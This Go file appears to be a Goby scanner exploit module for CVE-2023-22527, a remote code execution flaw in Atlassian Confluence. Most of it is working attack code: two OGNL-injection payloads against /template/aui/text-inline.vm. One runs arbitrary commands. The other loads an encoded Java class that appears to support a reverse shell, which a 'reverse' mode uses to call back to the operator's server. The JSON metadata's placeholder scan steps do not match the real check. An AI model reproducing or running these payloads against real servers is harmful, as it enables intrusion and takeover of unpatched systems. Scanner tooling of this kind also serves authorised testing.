package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Atlassian Confluence template/aui/text-inline.vm code execution vulnerability (CVE-2023-22527)",
    "Description": "<p>Atlassian Confluence is an enterprise team collaboration and knowledge management software developed by Atlassian that provides a centralized platform for creating, organizing and sharing your team's documents, knowledge base, project plans and collaborative content.</p><p>Atlassian Confluence has a remote code execution vulnerability in template/aui/text-inline.vm that could allow an unauthorized attacker to execute arbitrary code on an affected version.</p>",
    "Product": "ATLASSIAN-Confluence",
    "Homepage": "https://www.atlassian.com/",
    "DisclosureDate": "2024-01-16",
    "PostTime": "2024-01-23",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "header=\"X-Confluence-\" || banner=\"X-Confluence-\" || (body=\"name=\\\"confluence-base-url\\\"\" && body=\"id=\\\"com-atlassian-confluence\") || title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\")",
    "GobyQuery": "header=\"X-Confluence-\" || banner=\"X-Confluence-\" || (body=\"name=\\\"confluence-base-url\\\"\" && body=\"id=\\\"com-atlassian-confluence\") || title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\")",
    "Level": "3",
    "Impact": "<p>Atlassian Confluence has a remote code execution vulnerability in template/aui/text-inline.vm that could allow an unauthorized attacker to execute arbitrary code on an affected version.</p>",
    "Recommendation": "<p>The manufacturer has released patches and repair plans, please update in time: <a href=\"https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html\">https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and- confluence-server-1333990257.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-22527"
    ],
    "CNNVD": [
        "CNNVD-202401-1385"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "Atlassian Confluence template/aui/text-inline.vm 代码执行漏洞（CVE-2023-22527）",
            "Product": "ATLASSIAN-Confluence",
            "Description": "<p>Atlassian Confluence 是一款由 Atlassian 开发的企业团队协作和知识管理软件，提供了一个集中化的平台，用于创建、组织和共享团队的文档、知识库、项目计划和协作内容。</p><p>Atlassian Confluence 在 template/aui/text-inline.vm 存在远程代码执行漏洞，可以让未经授权的攻击者在受影响的版本上执行任意代码。</p>",
            "Recommendation": "<p>厂商已发布补丁和修复方案，请及时更新：<a href=\"https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html\" target=\"_blank\">https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html</a><br></p>",
            "Impact": "<p>Atlassian Confluence 在 template/aui/text-inline.vm 存在远程代码执行漏洞，可以让未经授权的攻击者在受影响的版本上执行任意代码。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Atlassian Confluence template/aui/text-inline.vm code execution vulnerability (CVE-2023-22527)",
            "Product": "ATLASSIAN-Confluence",
            "Description": "<p>Atlassian Confluence is an enterprise team collaboration and knowledge management software developed by Atlassian that provides a centralized platform for creating, organizing and sharing your team's documents, knowledge base, project plans and collaborative content.</p><p>Atlassian Confluence has a remote code execution vulnerability in template/aui/text-inline.vm that could allow an unauthorized attacker to execute arbitrary code on an affected version.</p>",
            "Recommendation": "<p>The manufacturer has released patches and repair plans, please update in time: <a href=\"https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and- confluence-server-1333990257.html\" target=\"_blank\">https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and- confluence-server-1333990257.html</a><br></p>",
            "Impact": "<p>Atlassian Confluence has a remote code execution vulnerability in template/aui/text-inline.vm that could allow an unauthorized attacker to execute arbitrary code on an affected version.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10909"
}`
	sendPayloaddgfyGvRY8dF := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewPostRequestConfig("/template/aui/text-inline.vm")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = true
		payloadConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadConfig.Data = "name=aaxxxa&list=ccc&list=ddd&list=ddd&list=ddd&list=ddd&listKey=11&size=1&multiple=1&label=111\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.poc[0],{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({\"" + cmd + "\"}))"
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}

	a10PayloadfyGvRY8dF := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewPostRequestConfig("/template/aui/text-inline.vm")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = true
		payloadConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadConfig.Header.Store("cmd", cmd)
		payloadConfig.Data = "name=aaxxxa&list=ccc&list=ddd&list=ddd&list=ddd&list=ddd&listKey=11&size=1&multiple=1&label=111\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.poc[0],{})%2b\\u0027&poc=(new+javax.script.ScriptEngineManager()).getEngineByName('js').eval(@org.apache.struts2.ServletActionContext@getRequest().getParameter('code'))&code=try {load(\"nashorn:mozilla_compat.js\");} catch (e) {}function getUnsafe(){var theUnsafeMethod = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");theUnsafeMethod.setAccessible(true); return theUnsafeMethod.get(null);}function removeClassCache(clazz){var unsafe = getUnsafe();var clazzAnonymousClass = unsafe.defineAnonymousClass(clazz,java.lang.Class.forName(\"java.lang.Class\").getResourceAsStream(\"Class.class\").readAllBytes(),null);var reflectionDataField = clazzAnonymousClass.getDeclaredField(\"reflectionData\");unsafe.putObject(clazz,unsafe.objectFieldOffset(reflectionDataField),null);}function bypassReflectionFilter() {var reflectionClass;try {reflectionClass = java.lang.Class.forName(\"jdk.internal.reflect.Reflection\");} catch (error) {reflectionClass = java.lang.Class.forName(\"sun.reflect.Reflection\");}var unsafe = getUnsafe();var classBuffer = reflectionClass.getResourceAsStream(\"Reflection.class\").readAllBytes();var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField(\"fieldFilterMap\");var methodFilterMapField = reflectionAnonymousClass.getDeclaredField(\"methodFilterMap\");if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName(\"java.util.HashMap\"))) {unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName(\"java.util.HashMap\").getConstructor().newInstance());}if (methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName(\"java.util.HashMap\"))) {unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(methodFilterMapField), java.lang.Class.forName(\"java.util.HashMap\").getConstructor().newInstance());}removeClassCache(java.lang.Class.forName(\"java.lang.Class\"));}function setAccessible(accessibleObject){var unsafe = getUnsafe();var overrideField = java.lang.Class.forName(\"java.lang.reflect.AccessibleObject\").getDeclaredField(\"override\");var offset = unsafe.objectFieldOffset(overrideField);unsafe.putBoolean(accessibleObject, offset, true);}function defineClass(bytes){var clz = null;var version = java.lang.System.getProperty(\"java.version\");var unsafe = getUnsafe();var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName(\"java.net.URL\"), 0));try{if (version.split(\".\")[0] >= 11) {bypassReflectionFilter();defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", java.lang.Class.forName(\"[B\"),java.lang.Integer.TYPE, java.lang.Integer.TYPE);setAccessible(defineClassMethod);clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);}else{var protectionDomain = new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName(\"java.security.cert.Certificate\"), 0)), null, classLoader, []);clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);}}catch(error){error.printStackTrace();}finally{return clz;}}function base64DecodeToByte(str) {var bt;try {bt = java.lang.Class.forName(\"org.apache.commons.codec.binary.Base64\").newInstance().decode(str);} catch (e) {e.printStackTrace();bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);}return bt;};var code=\"yv66vgAAADEBVQoABwCRCACSCgB1AJMIAJQHAJUKAAUAlgcAlwoAmACZCgAHAJoIAJsHAJwIAJ0IAJ4IAJ8IAIYKAHUAoAgAoQcAogoAEgCjCQCkAKUKAKYApwoABQCoBwCpCgApAKoKACkAqwoArACTCACtCgALAK4IAK8KAAsAsAgAsQoACwCyCgB1ALMIALQKAAsAtQgAtgkAdQC3CgC4ALkKALgAugkAdQC7BwC8CgApAL0KACkAvggAiggAvwgAwAoAdQDBCADCCgB1AMMHAMQKADIAxQcAxgoANADHCgB1AMgKADQAyQoANADKCgA0AMsKABIAzAoAMgDNCgALAM4IAM8KAKQA0AoACwDRCADSCgALANMIANQIANUHANYKAEQAkQoARADXCADYCgBEAMwIANkIANoIANsIANwKAN0A3goA3QDfBwDgCgDhAOIKAE8A4wgA5AoATwDlCgBPAOYKAE8A5woA4QDoCgDhAOkIAOoIAOsKAN0A7AcA7QoAWwDuCgBbAOIKAOEA7woAWwDvCgBbAPAKAPEA8goA8QDzCgD0APUKAPQAygUAAAAAAAAAMgoAKQD2CgDhAPcKAFsAywoAEgD4CgC4APkKAHUA%2bggA%2bwgA/AoABQD9BwD%2bCAD/CAEACACNCAEBBwECBwEDAQACaXABABJMamF2YS9sYW5nL1N0cmluZzsBAARwb3J0AQATTGphdmEvbGFuZy9JbnRlZ2VyOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACVNpZ25hdHVyZQEAKChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczwqPjsBAAVwcm94eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAFd3JpdGUBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACmNsZWFyUGFyYW0BAARleGVjAQAHcmV2ZXJzZQEAFihMamF2YS9sYW5nL1N0cmluZztJKVYBAANydW4BAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAKU291cmNlRmlsZQEACEExMC5qYXZhDAB7AHwBACdvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHQMAIAAgQEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMAQQBBQEAEGphdmEvbGFuZy9PYmplY3QHAQYMAQcBCAwBCQEKAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAEAC2dldFJlc3BvbnNlAQAJZ2V0V3JpdGVyDACEAIUBAAVmbHVzaAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAQsAfAcBDAwBDQEOBwEPDAEQAREMARIAgQEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAETARQMARUBFgcBFwEAAAwBGAEZAQAQY29tbWFuZCBub3QgbnVsbAwBGgEbAQAFIyMjIyMMARwBHQwAiACFAQABOgwBHgEfAQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAdwB4BwEgDAEhASIMASMBJAwAeQB6AQAQamF2YS9sYW5nL1RocmVhZAwAewElDAEmAHwBAAUkJCQkJAEAEmZpbGUgZm9ybWF0IGVycm9yIQwAhgCHAQAFQEBAQEAMAIkAhQEADGphdmEvaW8vRmlsZQwAewEnAQAYamF2YS9pby9GaWxlT3V0cHV0U3RyZWFtDAB7ASgMAI0AjgwAhgEpDAChAHwMASoAfAwBKwEbDAEsARsMAS0BLgEAB29zLm5hbWUMAS8AhQwBMAEbAQADd2luDAExATIBAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBMwE0AQAFIC1uIDQBAAIvYwEABSAtdCA0AQACc2gBAAItYwcBNQwBNgE3DACJATgBABFqYXZhL3V0aWwvU2Nhbm5lcgcBOQwBOgE7DAB7ATwBAAJcYQwBPQE%2bDAE/AUAMAUEBGwwBQgE7DAFDAHwBAAcvYmluL3NoAQAHY21kLmV4ZQwAiQFEAQAPamF2YS9uZXQvU29ja2V0DAB7AIsMAUUBRgwBRwFABwFIDAFJAUoMAUsBSgcBTAwAhgFNDAFOAU8MAVABSgwBUQEbDAFSAUoMAIoAiwEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMAVMBVAEAAltCAQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIBACZvcmcuYXBhY2hlLmNvbW1vbnMuY29kZWMuYmluYXJ5LkJhc2U2NAEAA0ExMAEAEmphdmEvbGFuZy9SdW5uYWJsZQEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAdmb3JOYW1lAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABHRyaW0BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEAFyhMamF2YS9sYW5nL1J1bm5hYmxlOylWAQAFc3RhcnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABEoTGphdmEvaW8vRmlsZTspVgEABShbQilWAQAFY2xvc2UBAAh0b1N0cmluZwEAD2dldEFic29sdXRlUGF0aAEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9JbnB1dFN0cmVhbQEACWF2YWlsYWJsZQEAAygpSQEABHJlYWQBABRqYXZhL2lvL091dHB1dFN0cmVhbQEABChJKVYBAAVzbGVlcAEABChKKVYBAAlleGl0VmFsdWUBAApnZXRNZXNzYWdlAQAIaW50VmFsdWUBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7ACEAdQAHAAEAdgACAAIAdwB4AAAAAgB5AHoAAAAJAAEAewB8AAIAfQAAAQsABwAGAAAAuyq3AAEqEgK2AANMKxIEA70ABbYABgEDvQAHtgAITSy2AAkSCgS9AAVZAxILU7YABiwEvQAHWQMSDFO2AAjAAAtOKxINA70ABbYABgEDvQAHtgAIOgQZBLYACRIOA70ABbYABhkEA70AB7YACDoFGQW2AAkSDwS9AAVZAxILU7YABhkFBL0AB1kDKi22ABBTtgAIVxkFtgAJEhEDvQAFtgAGGQUDvQAHtgAIV6cAD0wrtgATsgAUK7YAFbEAAQAEAKsArgASAAEAfgAAADYADQAAABIABAAUAAsAFQAeABYAQQAXAFUAGABuABkAkwAaAKsAHgCuABsArwAcALMAHQC6AB8AfwAAAAQAAQASAAEAgACBAAMAfQAAADkAAgADAAAAESu4ABawTbgAGLYAGSu2ABqwAAEAAAAEAAUAFwABAH4AAAAOAAMAAAApAAUAKgAGACsAfwAAAAQAAQAXAIIAAAACAIMAAQCEAIUAAQB9AAAA/wAEAAQAAACbK8YADBIbK7YAHJkABhIdsCu2AB5MKxIftgAgmQA7Kiu3ACESIrYAI00svgWfAAYSJLAqLAMytQAlKiwEMrgAJrgAJ7UAKLsAKVkqtwAqTi22ACsSLLArEi22ACCZACIqK7cAIRIitgAjTSy%2bBZ8ABhIusCosAzIsBDK2AC%2bwKxIwtgAgmQANKiortwAhtgAxsCoqK7cAIbYAMbAAAAABAH4AAABSABQAAAA1AA0ANgAQADgAFQA5AB4AOwApADwALwA9ADIAPwA5AEAARgBBAE8AQgBTAEMAVgBEAF8ARQBqAEYAcABHAHMASQB%2bAEoAhwBLAJEATQABAIYAhwABAH0AAAB2AAMABQAAADa7ADJZK7cAM067ADRZLbcANToEGQQsuAA2tgA3GQS2ADgZBLYAOacACzoEGQS2ADqwLbYAO7AAAQAJACYAKQASAAEAfgAAACYACQAAAFgACQBaABMAWwAcAFwAIQBdACYAYAApAF4AKwBfADEAYQACAIgAhQABAH0AAAAvAAMAAgAAABcrEh8SG7YAPBIwEhu2ADwSLRIbtgA8sAAAAAEAfgAAAAYAAQAAAGoAAQCJAIUAAQB9AAABxwAEAAkAAAEnEj24AD62AD9NK7YAHkwBTiwSQLYAQZkAQCsSQrYAQZkAICsSQ7YAQZoAF7sARFm3AEUrtgBGEke2AEa2AEhMBr0AC1kDEgxTWQQSSVNZBStTOgSnAD0rEkK2AEGZACArEkO2AEGaABe7AERZtwBFK7YARhJKtgBGtgBITAa9AAtZAxJLU1kEEkxTWQUrUzoEuABNGQS2AE5OuwBPWS22AFC3AFESUrYAUzoFGQW2AFSZAAsZBbYAVacABRIbOga7AE9ZLbYAVrcAURJStgBTOgW7AERZtwBFGQa2AEYZBbYAVJkACxkFtgBVpwAFEhu2AEa2AEg6BhkGOgctxgAHLbYAVxkHsDoFGQW2ADo6Bi3GAActtgBXGQawOggtxgAHLbYAVxkIvwAEAJAA%2bwEGABIAkAD7ARoAAAEGAQ8BGgAAARoBHAEaAAAAAQB%2bAAAAbgAbAAAAcwAJAHQADgB1ABAAdwAZAHgAKwB5AD8AewBWAH0AaAB%2bAHwAgACQAIMAmQCEAKsAhQC/AIYA0QCHAPcAiAD7AIwA/wCNAQMAiAEGAIkBCACKAQ8AjAETAI0BFwCKARoAjAEgAI0BJACPAAEAigCLAAEAfQAAAVkABAAMAAAAyRI9uAA%2btgA/EkC2AEGaAAkSWE6nAAYSWU64AE0ttgBaOgS7AFtZKxy3AFw6BRkEtgBQOgYZBLYAVjoHGQW2AF06CBkEtgBeOgkZBbYAXzoKGQW2AGCaAGAZBrYAYZ4AEBkKGQa2AGK2AGOn/%2b4ZB7YAYZ4AEBkKGQe2AGK2AGOn/%2b4ZCLYAYZ4AEBkJGQi2AGK2AGOn/%2b4ZCrYAZBkJtgBkFABluABnGQS2AGhXpwAIOgun/54ZBLYAVxkFtgBppwAJTi22AGpXsQACAKcArQCwABIAAAC/AMIAEgABAH4AAABuABsAAACbABAAnAAWAJ4AGQCgACIAoQAtAKIAQgCjAFAApABYAKUAYACmAG0AqAB1AKkAggCrAIoArACXAK4AnACvAKEAsACnALIArQCzALAAtACyALUAtQC3ALoAuAC/ALsAwgC5AMMAugDIALwAAQCMAHwAAQB9AAAALAADAAEAAAAQKiq0ACUqtAAotgBrtgBssQAAAAEAfgAAAAoAAgAAAMAADwDBAAkAjQCOAAEAfQAAARwABgAEAAAArAFMEm24ABZNLBJuBL0ABVkDEgtTtgAGLLYAbwS9AAdZAypTtgAIwABwwABwTKcABE0rxwBDEnG4ABYScgO9AAW2AAYBA70AB7YACE0stgAJEnMEvQAFWQMSC1O2AAYsBL0AB1kDKlO2AAjAAHDAAHBMpwAETSvHADQSdLgAFk0sEnMEvQAFWQMSC1O2AAZOLSy2AG8EvQAHWQMqU7YACMAAcMAAcEynAARNK7AAAwACAC0AMAASADUAcQB0ABIAeQCmAKkAEgABAH4AAABGABEAAADJAAIAywAIAMwALQDPADAAzQAxANAANQDSAEwA0wBxANYAdADUAHUA2AB5ANoAfwDbAI8A3ACmAN8AqQDdAKoA4QABAI8AAAACAJA=\";bypassReflectionFilter();var clz = defineClass(base64DecodeToByte(code));clz.newInstance()"
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			// poc 阶段，用两种payload的方式进行测试
			randStr := goutils.RandomHexString(10)
			if resp, _ := sendPayloaddgfyGvRY8dF(hostInfo, "echo "+randStr); resp != nil && resp.StatusCode == 200 && resp.Header != nil && strings.Contains(resp.Header.Get("X-Cmd-Response"), randStr) {
				stepLogs.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			if resp, _ := a10PayloadfyGvRY8dF(hostInfo, "@@@@@echo "+randStr); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randStr) {
				stepLogs.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			// cmd 也采用两种方式，会判断响应结果是否为空，如果defineclass的方式，结果为空了，会换成另外一种payload的方式
			if attackType == "cmd" {
				if resp, err := a10PayloadfyGvRY8dF(expResult.HostInfo, "@@@@@"+goutils.B2S(ss.Params["cmd"])); resp != nil && resp.StatusCode == 200 && strings.LastIndex(resp.RawBody, "<!DOCTYPE html>") > 0 {
					expResult.Success = true
					expResult.Output = resp.RawBody[:strings.LastIndex(resp.RawBody, "<!DOCTYPE html>")]
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					if resp, err := sendPayloaddgfyGvRY8dF(expResult.HostInfo, goutils.B2S(ss.Params["cmd"])); resp != nil && resp.StatusCode == 200 && resp.Header != nil && resp.Header.Get(`X-Cmd-Response`) != "" {
						expResult.Success = true
						expResult.Output = resp.Header.Get(`X-Cmd-Response`)
					} else if err != nil {
						expResult.Output = err.Error()
					} else {
						expResult.Output = `漏洞利用失败`
					}
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				a10PayloadfyGvRY8dF(expResult.HostInfo, fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp))
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		},
	))
}
